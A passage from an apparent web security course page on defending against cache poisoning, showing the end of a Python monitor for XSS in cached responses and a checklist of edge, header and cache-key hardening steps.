        alerts = []
        
        <span class="code-comment"># Check if response contains XSS in cached content</span>
        <span class="code-keyword">if</span> <span class="code-string">'cache-control'</span> <span class="code-keyword">in</span> response.headers:
            cache_control = response.headers[<span class="code-string">'cache-control'</span>].lower()
            is_cacheable = <span class="code-string">'public'</span> <span class="code-keyword">in</span> cache_control <span class="code-keyword">or</span> <span class="code-string">'max-age'</span> <span class="code-keyword">in</span> cache_control
            
            <span class="code-keyword">if</span> is_cacheable:
                <span class="code-keyword">for</span> pattern <span class="code-keyword">in</span> self.SUSPICIOUS_PATTERNS:
                    <span class="code-keyword">if</span> re.<span class="code-function">search</span>(pattern, response.text, re.IGNORECASE):
                        alerts.append({
                            <span class="code-string">'type'</span>: <span class="code-string">'cached_xss'</span>,
                            <span class="code-string">'pattern'</span>: pattern,
                            <span class="code-string">'url'</span>: request.url,
                            <span class="code-string">'severity'</span>: <span class="code-string">'critical'</span>
                        })
        
        <span class="code-keyword">return</span> alerts
    
    <span class="code-keyword">def</span> <span class="code-function">alert</span>(self, alerts):
        <span class="code-keyword">for</span> alert <span class="code-keyword">in</span> alerts:
            <span class="code-keyword">if</span> alert[<span class="code-string">'severity'</span>] == <span class="code-string">'critical'</span>:
                <span class="code-comment"># Immediate notification + cache purge</span>
                self.<span class="code-function">purge_cache</span>(alert[<span class="code-string">'url'</span>])
                self.<span class="code-function">notify_security_team</span>(alert)
            
            self.<span class="code-function">log_to_siem</span>(alert)</code></pre>
        </div>

        <h3 class="subsection-title">Security Checklist Summary</h3>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Strip dangerous headers at the edge</strong><br>
            Remove X-Forwarded-Host, X-Forwarded-Scheme, and similar headers at CDN/WAF before they reach origin
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Never use client-controlled headers in response generation</strong><br>
            Hardcode URLs, schemes, and hosts in application configuration
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Validate Host headers against strict allowlists</strong><br>
            Reject requests with unexpected Host values
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Configure cache keys to include all variance factors</strong><br>
            If you vary by header, include it in the cache key; otherwise normalize and strip
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Set explicit Cache-Control headers</strong><br>
            Use no-store for dynamic content; never allow caching of user-specific data
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Monitor for suspicious header combinations</strong><br>
            Alert when dangerous headers appear in requests to cacheable endpoints
          </div>
        </div>

        <div class="checklist-item">
          <span class="checklist-icon">✓</span>
          <div>
            <strong>Regular cache penetration testing</strong><br>
            Use ParamMiner, Burp Suite, and custom scripts to test for unkeyed inputs quarterly
          </div>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Implementing Defense in Depth for Cache Poisoning</div>
          <div class="diagram-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete cache poisoning protection implementation walkthrough]
          </div>
        </div>
      </div>

    </main>
  </div>

  <script>
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>


</html>